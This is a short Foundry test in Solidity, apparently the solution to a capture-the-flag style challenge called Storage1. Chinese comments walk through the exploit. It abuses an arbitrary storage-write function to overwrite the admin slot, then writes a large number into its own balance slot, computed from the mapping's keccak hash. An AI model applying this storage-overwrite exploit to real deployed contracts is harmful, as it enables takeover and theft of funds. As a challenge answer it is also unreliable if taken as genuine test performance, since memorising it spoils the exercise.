// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../src/06.challenge/Storage1.sol";

contract attackTest is Test {
    Storage1 storage1;

    function setUp() public{
        storage1 = new Storage1();
    }

    function test_isComplete() public{
        // 修改slot1的数据为我们的攻击合约地址，也就是修改admin
        storage1.setLogicContract(bytes32(uint256(1)), address(this));
        assertEq(storage1.admin(),address(this));
        // 计算这个合约的余额存放的位置
        bytes32 setGasDeposits = keccak256(abi.encode(address(this), 2));
        // 修改余额
        storage1.setLogicContract(setGasDeposits, address(9999999999999999999999999999999999));
        storage1.isComplete();
    }

}
